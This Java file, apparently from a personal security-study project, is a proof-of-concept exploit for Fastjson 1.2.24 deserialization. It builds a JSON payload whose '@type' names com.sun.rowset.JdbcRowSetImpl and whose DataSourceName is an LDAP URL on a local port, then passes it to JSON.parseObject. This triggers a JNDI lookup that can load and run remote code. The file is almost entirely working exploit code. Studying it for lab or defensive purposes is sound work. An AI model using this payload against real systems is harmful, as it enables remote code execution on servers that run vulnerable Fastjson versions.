package Fastjson.version24;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: Fastjson
 * @Author: Clown
 * @CreateTime: 2023-10-10  16:10
 */
public class poc24JdbcRowSectimpl {
    public static void main(String[] args) {
        String str = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false}";
        JSON.parseObject(str);
    }
}
